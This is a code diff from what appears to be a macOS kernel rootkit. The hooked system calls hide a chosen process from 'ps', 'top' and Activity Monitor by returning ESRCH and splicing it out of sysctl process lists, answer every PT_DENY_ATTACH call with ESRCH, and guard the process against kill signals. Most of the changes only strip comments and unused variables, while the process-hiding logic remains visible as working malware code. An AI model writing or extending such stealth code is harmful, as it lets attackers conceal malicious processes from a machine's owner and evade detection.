@@ -311,11 +311,11 @@ kern_return_t hide_user(int cmd)
  */
 static int ifc_ptrace(struct proc *p, struct ptrace_args *uap, int *retv)
 {
-	char processname[MAXCOMLEN+1];
-	
 	/* verify if it's a PT_DENY_ATTACH request and fix for all processes that call it */
 	if(uap->req == PT_DENY_ATTACH) {
-		proc_name(p->p_pid, processname, sizeof(processname));
+		//char processname[MAXCOMLEN+1];
+		
+		//proc_name(p->p_pid, processname, sizeof(processname));
 		
 		return ESRCH;
 	}
@@ -342,7 +342,6 @@ static int ifc_sysctl(struct proc *p, struct __sysctl_args *uap, int *retv)
 	int ret = sys_sysctl(p, uap, retv);
 	int i = 0;
 	
-	/* grab MIB from user space */
 	copyin(uap->name, &mib, sizeof(mib));
 	
 	/* this handles 'ps $PID' */
@@ -352,9 +351,6 @@ static int ifc_sysctl(struct proc *p, struct __sysctl_args *uap, int *retv)
 			
 			copyout(&oldlen, uap->oldlenp, sizeof(oldlen));
 			
-			/*
-			 * we must return ESRCH so a call from 'top' or 'Activity Monitor' will be useless
-			 */
 			return ESRCH;
 		}
 
@@ -367,7 +363,7 @@ static int ifc_sysctl(struct proc *p, struct __sysctl_args *uap, int *retv)
 			if(g_counter == 0) {
 				g_counter = 1;
 				
-				/* 64 bit process */
+				/* 64 bit proc */
 				if(p->p_flag & P_LP64) {
 					copyin(uap->oldlenp, &oldlen, sizeof(oldlen));
 					
@@ -396,7 +392,6 @@ static int ifc_sysctl(struct proc *p, struct __sysctl_args *uap, int *retv)
 							 */
 							bcopy(uap->old + (i + 1) * sizeof(kpr64), uap->old + i * sizeof(kpr64), oldlen - (i + 1) * sizeof(kpr64));
 							
-							/* we found our process, get out */
 							goto out;
 						}
 					}
@@ -452,10 +447,6 @@ static int ifc_sysctl(struct proc *p, struct __sysctl_args *uap, int *retv)
 
 static int ifc_kill(struct proc *p, struct kill_args *uap, int *retv)
 {
-	char targetname[MAXCOMLEN + 1];
-	
-	proc_name(uap->pid, targetname, sizeof(targetname));
-	
 	/*
 	 * we check if it's our PID being signaled
 	 *
